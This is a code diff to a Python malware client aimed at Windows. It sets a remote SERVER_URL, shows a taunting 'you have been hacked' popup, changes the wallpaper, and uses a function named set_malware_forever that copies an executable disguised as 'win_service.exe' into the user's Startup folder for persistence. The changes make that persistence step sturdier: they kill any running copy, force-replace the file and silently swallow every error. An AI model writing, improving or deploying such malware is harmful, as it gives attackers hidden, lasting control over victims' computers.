@@ -9,6 +9,7 @@ SERVER_URL = "http://192.168.88.106:2020"
 import shlex
 import pyautogui
 import random
+import shutil
 import ctypes
 from time import sleep
 banner = r"""
@@ -68,11 +69,8 @@ def open_popup(popup=f"""
 """):
     ctypes.windll.user32.MessageBoxW(0, popup, "YOU HAVE BEEN HACKED BITCH", 0x40 | 0x1)
 def set_malware_forever():
-    file_name="win_service.exe"
-    if hasattr(sys, "_MEIPASS"):
-        base_path = sys._MEIPASS
-    else:
-        base_path = os.path.dirname(os.path.abspath(__file__))
+    file_name = "win_service.exe"
+    base_path = getattr(sys, "_MEIPASS", os.path.dirname(os.path.abspath(__file__)))
     source = os.path.join(base_path, file_name)
     startup_path = os.path.join(
         os.environ["APPDATA"],
@@ -80,16 +78,19 @@ def set_malware_forever():
     )
     destination = os.path.join(startup_path, file_name)
     try:
+        subprocess.run(
+            ["taskkill", "/F", "/IM", file_name],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL
+        )
         if os.path.exists(destination):
             subprocess.run(
-                ["powershell", "-Command", f'Remove-Item "{destination}" -Force'],
-                check=True
+                ["powershell", "-Command", f'Remove-Item -Force "{destination}"'],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL
             )
-        subprocess.run(
-            ["powershell", "-Command", f'Copy-Item "{source}" "{destination}"'],
-            check=True
-        )
-    except subprocess.CalledProcessError:
+        shutil.copy2(source, destination)
+    except Exception:
         pass
 def set_wallpaper(file):
     SPI_SETDESKWALLPAPER = 20
